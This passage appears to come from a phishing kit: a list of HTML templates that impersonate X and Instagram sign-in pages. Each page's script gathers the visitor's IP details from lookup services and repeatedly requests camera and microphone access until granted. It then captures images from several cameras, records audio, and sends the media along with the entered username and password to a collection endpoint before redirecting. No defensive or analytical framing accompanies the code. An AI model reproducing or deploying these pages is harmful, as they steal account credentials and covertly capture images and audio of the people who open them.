                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 64px;
                height: 64px;
            }
            h1 {
                font-size: 18px;
            }
            .subtitle {
                font-size: 12px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 15px;
            }
            .create-account {
                margin-bottom: 10px;
            }
            .next-btn, .signin-btn {
                width: 100%;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://cdn.prod.website-files.com/5d66bdc65e51a0d114d15891/64cebe1d31f50e161e4c825a_X-logo-transparent-white-twitter.png" alt="X Logo" class="logo">
        <h1>Sign in to your account</h1>
        <div class="subtitle">See what’s happening on X</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Phone, email, or username" required>
            <div id="email-error" class="error">Enter a valid phone, email, or username</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot your username?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Don’t have an account? Sign up</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://cdn.prod.website-files.com/5d66bdc65e51a0d114d15891/64cebe1d31f50e161e4c825a_X-logo-transparent-white-twitter.png" alt="X Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">About</a>
        <a href="#">Help Center</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Cookie Policy</a>
        <a href="#">Accessibility</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://x.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Phone, email, or username cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid phone, email, or username";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - X</title>
    <link href="https://fonts.googleapis.com/css2?family=Helvetica:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Helvetica', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #000000; /* X'in koyu arka planı */
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 30px;
            background-color: #1D2525; /* Giriş kutusu arka planı */
            border-radius: 16px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 40px;
            height: 40px;
            filter: brightness(0) invert(1); /* Beyaz logo */
        }
        h1 {
            font-size: 20px;
            font-weight: 500;
            color: #FFFFFF;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #71767B;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            font-size: 16px;
            border: 1px solid #536471;
            border-radius: 8px;
            outline: none;
            box-sizing: border-box;
            background-color: #2F3336;
            color: #FFFFFF;
        }
        input::placeholder {
            color: #71767B;
        }
        input:focus {
            border-color: #1DA1F2;
            box-shadow: 0 0 0 1px #1DA1F2;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #1DA1F2;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account a {
            color: #1DA1F2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #1DA1F2;
            color: #FFFFFF;
            border: none;
            padding: 8px 20px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #1991DA;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #71767B;
            font-size: 12px;
            padding: 10px 0;
            background-color: #000000; /* Opak siyah arka plan */
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.1);
        }
        .footer a {
            color: #71767B;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            color: #1DA1F2;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #F4212E;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 64px;
                height: 64px;
            }
            h1 {
                font-size: 18px;
            }
            .subtitle {
                font-size: 12px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 15px;
            }
            .create-account {
                margin-bottom: 10px;
            }
            .next-btn, .signin-btn {
                width: 100%;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://cdn.prod.website-files.com/5d66bdc65e51a0d114d15891/64cebe1d31f50e161e4c825a_X-logo-transparent-white-twitter.png" alt="X Logo" class="logo">
        <h1>Sign in to your account</h1>
        <div class="subtitle">See what’s happening on X</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Phone, email, or username" required>
            <div id="email-error" class="error">Enter a valid phone, email, or username</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot your username?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Don’t have an account? Sign up</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://cdn.prod.website-files.com/5d66bdc65e51a0d114d15891/64cebe1d31f50e161e4c825a_X-logo-transparent-white-twitter.png" alt="X Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">About</a>
        <a href="#">Help Center</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Cookie Policy</a>
        <a href="#">Accessibility</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://x.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Phone, email, or username cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid phone, email, or username";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>"""], "il0": ["""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Instagram</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(45deg, #FCAF45, #FD1D1D, #C13584, #833AB4);
            background-size: 400% 400%;
            animation: gradientBG 6s ease infinite;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .container {
            width: 100%;
            max-width: 350px;
            padding: 40px 30px 30px;
            background-color: #fff;
            border-radius: 8px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 100px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #262626;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #8E8E8E;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            font-size: 14px;
            border: 1px solid #DBDBDB;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #FAFAFA;
        }
        input:focus {
            border-color: #0095F6;
            box-shadow: 0 0 0 1px #0095F6;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #0095F6;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account a {
            color: #0095F6;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #0095F6;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #0069D9;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #8E8E8E;
            font-size: 12px;
            padding: 10px 0;
            background-color: #FFFFFF;
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.1);
        }
        .footer a {
            color: #8E8E8E;
            text-decoration: none;
            margin: 0 8px;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #D93025;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 80px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 15px;
            }
            .create-account {
                margin-bottom: 10px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
        <div class="subtitle">Connect with friends, share your moments</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Username, email, or phone" required>
            <div id="email-error" class="error">Enter a valid username, email, or phone</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot your username?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Create an account</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">English</a>
        <a href="#">About</a>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://instagram.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Username, email, or phone cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid username, email, or phone";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Instagram</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(45deg, #FCAF45, #FD1D1D, #C13584, #833AB4);
            background-size: 400% 400%;
            animation: gradientBG 6s ease infinite;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .container {
            width: 100%;
            max-width: 350px;
            padding: 40px 30px 30px;
            background-color: #fff;
            border-radius: 8px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 100px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #262626;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #8E8E8E;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            font-size: 14px;
            border: 1px solid #DBDBDB;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #FAFAFA;
        }
        input:focus {
            border-color: #0095F6;
            box-shadow: 0 0 0 1px #0095F6;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #0095F6;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account a {
            color: #0095F6;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #0095F6;
            color: white;
            border: none;
            padding: 8px 20px;
